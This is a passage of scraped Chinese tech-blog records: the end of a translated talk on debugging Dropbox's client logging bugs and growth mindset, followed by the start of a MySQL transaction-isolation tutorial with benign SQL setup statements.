class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0048 seconds] -->\r\n<p>桌面客户端将生成日志 。这些日志被压缩、加密并写入磁盘，然后客户端定期将它们发送到服务器。客户端将从磁盘读取日志并将它们发送到日志服务器。日志服务器将解密并存储，然后返回 200 响应。</p>\n<p>如果客户端无法连接日志服务器，它不会让日志目录无限增大。当日志目录达到一定大小时，客户端将删除日志从而保证日志目录的大小在最大范围之内。</p>\n<p>最初的两个 bug 是些小问题。第一个是桌面客户端向服务器发送日志时从最旧的开始（而不是从最新的开始）。这不是我们想要的，比如，如果客户端报告了一个异常，服务器将要求客户端发送日志文件，这时你可能关心刚刚发生的情况的日志，而不是磁盘上最旧的日志。</p>\n<p>第二个 bug 与第一个类似：如果日志目录达到设置的最大值，客户端将从最新的日志开始删除（而不是删除最旧的日志）。这时，哪种方法都会删除日志，只是我们更关心比较新的日志。</p>\n<p>第三个 bug 与加密有关。有时，服务器无法解密日志文件（我们通常无法找到原因-可能是字节反转）。后端无法正确处理这个错误，因此服务器会返回 500 响应。客户端在接收到 500 响应时的表现相当合理：它将假设服务器已关闭。因此，它会停止发送日志文件，不再尝试发送其它文件。</p>\n<p>对损坏的日志文件返回 500 响应显然是错误的行为。我们可以考虑返回 400 响应，因为这是客户端的问题。但是客户端也无法解决这个问题-如果日志文件现在无法解密，将来也无法解密。因此，我们真正想让客户端做的只是删除日志文件并继续工作。实际上，客户端从服务器获取 200 响应时默认日志文件存储成功。所以，如果日志文件无法解密，返回 200 响应就可以了。</p>\n<p>所有这些 bug 都很容易修复。前两个错误发生在客户端，所以我们在 alpha 版本进行修复，但是还没有发布给大多数客户。我们在服务器上修复第三个错误并部署。</p>\n<p>突然之间，日志集群流量激增。服务团队询问我们是否知道发生了什么事情。我花了一分钟的时间把所有情况放在一起。</p>\n<p>在这些问题修复之前，四件事情正在发生：</p>\n<ol class=\"ol-list\" start=\"\">\n<li class=\"md-list-item\">日志文件从最老版本开始发送</li>\n<li class=\"md-list-item\">日志文件从最新版本开始删除</li>\n<li class=\"md-list-item\">如果服务器无法解密日志文件，它将返回 500 响应</li>\n<li class=\"md-list-item\">如果客户端接收到 500 响应，它将停止发送日志</li>\n</ol>\n<p>客户端可能会尝试发送损坏的日志文件，服务器返回 500 响应，客户端放弃发送日志。下一次运行时，它会尝试再次发送相同的文件，再次失败并再次放弃。最终日志目录会变满，客户端将开始删除最新日志文件，并将损坏的日志文件保留在磁盘上。</p>\n<p>这三个 bug 的结果是：如果客户端曾经有一个损坏的日志文件，我们将再也看不到来自该客户端的日志文件。</p>\n<p>问题在于，处于这种状态的客户端比我们想象的要多得多。 任何具有单个损坏文件的客户端都无法将日志文件发送到服务器。 现在这个问题被解决了，他们都在发送日志目录中的其余内容。</p>\n<h3>我们的选择</h3>\n<p>世界各地的机器会造成很大的流量，我们可以做什么呢？（在与 Dropbox 规模相当的公司工作是件有趣的事情，特别是 Dropbox 的桌面客户端规模：你可以轻易地触发自我 DDOS ）。</p>\n<p>进行部署时，发现问题的第一个选择是回滚。这是完全合理的选择，但是在这种情况下没有任何帮助。我们要转换的不是服务器上的状态，而是客户端上的状态–我们已经删除了这些文件。回滚服务器将防止其它客户端进入这个状态，但是不能解决问题。</p>\n<p>增加日志集群的规模可行吗？我们这样做了，并开始接收到更多的请求，现在我们已经进行了扩容。我们又进行了一次扩容，但是不能总这样。为什么不能？这些集群不是隔离的，它将请求另外一个集群(这里是为了处理异常)。如果遇到指向一个集群的 DDOS ，并且持续扩大集群规模，那么需要解决它们的依赖关系，这样就变成两个问题了。</p>\n<p>我们考虑的另一个选择是减轻负担-你不需要每个日志文件，所以我们可以放弃请求。这里的一个挑战在于很难确定哪个需要哪个不需要，我们无法快速区分新日志和旧日志。</p>\n<p>我们确定的解决方案是 Dropbox 在许多不同场合使用的解决方案：我们有一个自定义标头<code>chillout</code><span class=\"\">，所有的客户端都可以接收这个标头。如果客户端接收到包含这个标头的响应，那么它在设定时间内不发送任何请求。有人非常明智的在很早的时候将它添加到 Dropbox 客户端中，多年来它不止一次派上用场。日志记录服务器无法设置这个标头，但这是一个容易解决的问题。我们的两个同事（ Isaac Goldberg 和 John Lai ）提供了支持。我们首先将日志集群的 chillout 设置为两分钟，高峰过去几天之后再将其关闭。</span></p>\n<h3>了解你的系统</h3>\n<p>这个 bug 的第一个教训是了解你的系统。我头脑中有一个很好的客户端和服务器进行交互的模型。但是，我并没有想到服务器同时与所有客户端交互时会发生什么？这是我从来没有想到过的复杂程度。</p>\n<h3>了解你的工具</h3>\n<p>第二个教训是了解你的工具。如果事情发生了，你可以采取什么措施？你可以反转迁移吗？如果事情发生了，你如何了解它，如何找到更多信息？最好在危机发生之前了解这些内容，如果你没有这样做，你将在危机发生过程中学到，然后永远不会忘记。</p>\n<h3>功能标志位 &amp; 服务端门控</h3>\n<p>如果写移动或客户端应用，这是第三个教训：需要服务端特性门控和服务端标志位。当你发现一个问题并且无法控制服务端，发布一个新的版本或者向应用商店提交一个新版本可能需要几天甚至几周的时间。那是一种很不好的方法。Dropbox 客户端不需要处理应用商店审查流程，但是向几千万客户端推送也需要时间。我们也可以这样解决，出现问题时翻转服务器上的开关然后十分钟解决问题。</p>\n<p>但是，这个策略也有开销。添加很多标志位会增加代码的复杂度。在测试中会遇到组合问题：如何同时启用了功能 A 和功能 B，或者只有一个，或者一个都不启动 —如果具有 N 个特性则会非常复杂。完成之后请工程师清理功能标志位也将会非常困难（我也犯了这个错误）。对于桌面客户端来讲，可能同时会有很多版本，这将很难处理。</p>\n<p>但是好处在于—当你需要它们时，你真的非常需要它。</p>\n<h2>如何热爱 bugs</h2>\n<p>我谈到了我喜欢的一些 bug，并且谈到了为什么热爱这些 bug 。 现在我想告诉你如何去热爱 bug 。 如果你还不喜欢 bug，我知道一种学习方式–具有成长思维模式。</p>\n<p>社会学家 Carol Dweck 在人们如何看待能力方面做过很多有趣的研究。她发现人们使用两种不同的框架认识能力。第一个，她称之为固定思维模式，认为能力是一成不变的，人们无法改变自己的能力。另一个思维模式为成长思维模式，在成长思维模式下，人们认为能力是可塑的，不断的努力可以让能力变得更强。</p>\n<p>Dweck 发现一个人的能力框架-他们持有固定思维模式还是成长思维模式-会非常明显的影响他们选择任务的方式、他们应对挑战的方式、他们的认知表现、甚至他们的诚实。</p>\n<p>我在 Kiwi PyCon 主题演讲中也谈到了成长思维，下面这些只是部分摘录，你可以阅读完整版本<span class=\"\"><a href=\"http://akaptur.com/blog/2015/10/10/effective-learning-strategies-for-programmers/\">这里</a></span></p>\n<p>关于诚实：</p>\n<blockquote><p>之后，他们让学生把这项研究的结果写信告诉笔友：“我们在学校做了这项研究，这是我得到的分数。” 他们发现近一半因为聪明被称赞的学生篡改了分数，因为努力工作而受称赞的学生则基本没有不诚实的。</p></blockquote>\n<p>关于努力：</p>\n<blockquote><p>几项研究发现，有固定思维模式的人可能不愿意付出努力，因为他们认为需要努力意味着他们不擅长正在从事的事情。Dweck 指出：“ 如果每次任务都需要努力，那么很难保持对自己能力的信心，你的能力将会受到质疑。”</p></blockquote>\n<p>对混乱的反应：</p>\n<blockquote><p>他们发现，不管资料里是否含有混乱的段落，成长思维的学生大约能够掌握资料的 70% 。固定思维的学生中，如果阅读不包括混乱段落的书，他们也可以掌握资料的 70%。但是当固定思维的学生遇到混乱的段落，他们的掌握率下降到 30% 。固定思维的学生在从混乱恢复过来的过程中会遇到很大的困难。</p></blockquote>\n<p>这些发现表明，debug 过程中成长思维非常关键。我们需要从混乱过程中恢复过来，对我们理解的局限性保持坦诚，有时找到解决方案的道路真的非常曲折—所有这些，具有成长思维的人更容易处理，遇到痛苦也会少一些。</p>\n<h3>热爱你的 bug</h3>\n<p>通过在 Recurse Center 工作时的庆祝挑战，我学会了热爱 bug 。一位参与者会坐到我旁边说：“[叹气] 我想我遇到了一个奇怪的 Python 错误”，我说：“太棒了，我热爱奇怪的 Python 错误！”首先，这是绝对正确的，但是更重要的是，这强调参与者找出一些他们努力取得成就的东西，完成它对于他们来说是件好事。</p>\n<p>正如我提到的， Recurse Center 没有截止期限和重要节点，这种环境非常自由。我会说：“你可以花一整天的时间去查找 Flask 中这个奇怪的 bug ，多么刺激！” 在 Dropbox 和 Pilot，我们要发布产品、有截止日期、有用户，我并不总能花一天的时间解决一个奇怪的 bug 。因此，我对具有截止日期的现实世界深表同情。但是，如果我有一个需要修复的 bug ，我必须修复它，抱怨这个错误并不会帮助我更快地修复它。 我认为，即使在最终期限的即将到来的时候，你仍然可以持这种态度。</p>\n<p>如果你热爱 bug ，在解决棘手问题时可能会获得更多的乐趣。你可能不那么担心并更加专注。最终会从中学到更多。最后，你可以与朋友和同事分享 bug ，这可以帮助你和你的队友。</p>\n<h3>谢谢</h3>\n<p>感谢那些对这次演讲给我反馈以及帮助我来到这里的朋友：</p>\n<ul class=\"ul-list\">\n<li class=\"md-list-item\">Sasha Laundy</li>\n<li class=\"md-list-item\">Amy Hanlon</li>\n<li class=\"md-list-item\">Julia Evans</li>\n<li class=\"md-list-item\">Julian Cooper</li>\n<li class=\"md-list-item\">Raphael Passini Diniz 和 Python Brasil 团队的其他成员</li>\n</ul>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/11eefac5bf4ae36c73b7b40eb087be7b.jpg\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2016/10/02a9f7817f8dd0012ff1327fde5bdc94.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114165\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114165votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114165\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/wx232824506\">学以致用123</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/wx232824506\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            应用软件开发，主要用python、sql        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/wx232824506\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/wx232824506/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/wx232824506/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 21</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/5ca0d1af72e4f04453c0e91f066d17bc56b03d52.jpg"},{"url_object_id": "7695e72cfe180b1aba1ddb02ab4d4c1e", "title": ["MySQL 事务隔离级别"], "url": "http://blog.jobbole.com/114241/", "create_date": "2018/07/29", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/e78e36715813f49e9e62fe0c6050075c.png"], "praise_nums": "2", "comment_nums": 0, "fav_nums": 0, "tags": "IT技术, MySQL, 数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://blog.csdn.net/sdlyjzh/article/details/79920266\">sdlyjzh</a>   </div><p>本文会根据实际工作中碰到的例子，梳理清楚数据库事务的隔离级别。内容很简单，如果你能静下心来看完，一定会对你理解隔离级别有很大的帮助。</p>\n<p>想象一个场景。抽奖，如果用户中奖了，一般有如下几个流程：</p>\n<p>扣减奖品数量；</p>\n<p>记录用户中奖信息；</p>\n<p>试想如果扣减奖品数量了，结果记录用户中奖数据的时候失败了，那么数据就会出现不一致的问题。这种场景，就可以使用事务。因为事务的一个特性，就是<strong>原子性：要么不做，要么全做。</strong></p>\n<p>上述问题解决了。再想一下这样的场景：在抽奖前，先查询奖品剩余数量，如果剩余数量&lt;1，则任务抽奖活动已经结束，不再进行抽奖。如果事务A扣减奖品数量但未提交，事务B查询剩余奖品数量，此时应该是多少呢？这就和事务的隔离级别有关系了。</p>\n<p>在讨论隔离级别前，我们先做一些数据库的初始化操作：</p>\n<p>建表：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b626a6021224082301548\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCREATE TABLE `Tran_test` (\r\n  `id` bigint(20) NOT NULL,\r\n  `userId` bigint(20) NOT NULL DEFAULT '0',\r\n  `weChatId` varchar(50) NOT NULL DEFAULT '' COMMENT '微信id(openId、uninId)',\r\n  `orderId` bigint(20) NOT NULL DEFAULT '0' COMMENT '商城订单id',\r\n  `count` bigint(10) DEFAULT NULL,\r\n  PRIMARY KEY (`id`)\r\n) ENGINE=InnoDB DEFAULT CHARSET=utf8</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b626a6021224082301548-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b626a6021224082301548-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b626a6021224082301548-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b626a6021224082301548-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b626a6021224082301548-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b626a6021224082301548-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b626a6021224082301548-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b626a6021224082301548-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b626a6021224082301548-1\"><span class=\"crayon-e\">CREATE </span><span class=\"crayon-i\">TABLE</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">Tran_test</span><span class=\"crayon-sy\">`</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b626a6021224082301548-2\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">`</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bigint</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">20</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">NOT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b626a6021224082301548-3\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">userId</span><span class=\"crayon-sy\">`</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bigint</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">20</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">NOT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">DEFAULT</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'0'</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b626a6021224082301548-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">weChatId</span><span class=\"crayon-sy\">`</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">varchar</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">50</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">NOT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">DEFAULT</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">''</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">COMMENT</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'微信id(openId、uninId)'</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b626a6021224082301548-5\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">orderId</span><span class=\"crayon-sy\">`</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bigint</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">20</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">NOT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">DEFAULT</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'0'</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">COMMENT</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'商城订单id'</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b626a6021224082301548-6\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">count</span><span class=\"crayon-sy\">`</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bigint</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">DEFAULT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b626a6021224082301548-7\"><span class=\"crayon-h\">  </span><span class=\"crayon-e\">PRIMARY </span><span class=\"crayon-e\">KEY</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">`</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">`</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b626a6021224082301548-8\"><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ENGINE</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">InnoDB </span><span class=\"crayon-st\">DEFAULT</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CHARSET</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">utf8</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0024 seconds] -->\r\n<p>初始化1个奖品：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b626a602122e146848135\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ninsert into Tran_test (id,count) values(1,1)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b626a602122e146848135-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b626a602122e146848135-1\"><span class=\"crayon-e\">insert </span><span class=\"crayon-e\">into </span><span class=\"crayon-e\">Tran_test</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">count</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">values</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3>未提交读</h3>\n<p>事务中的修改，即使没有提交，也会被其他事务读取。</p>\n<p>下面通过mysql演示：</p>\n<p>设置隔离级别为为提交读：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b626a6021232380631085\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSET GLOBAL TRANSACTION ISOLATION LEVEL READ UNCOMMITTED;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b626a6021232380631085-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b626a6021232380631085-1\"><span class=\"crayon-e\">SET </span><span class=\"crayon-m\">GLOBAL</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">TRANSACTION </span><span class=\"crayon-e\">ISOLATION </span><span class=\"crayon-e\">LEVEL </span><span class=\"crayon-e\">READ </span><span class=\"crayon-v\">UNCOMMITTED</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p> </p>\n<p> </p>\n<table cellspacing=\"1\" cellpadding=\"1\">\n<tbody>\n<tr>\n<td>事务A</td>\n<td>事务B</td>\n</tr>\n<tr>\n<td>start transaction;</td>\n<td>start transaction;</td>\n</tr>\n<tr>\n<td>select * from Tran_test where id=1; 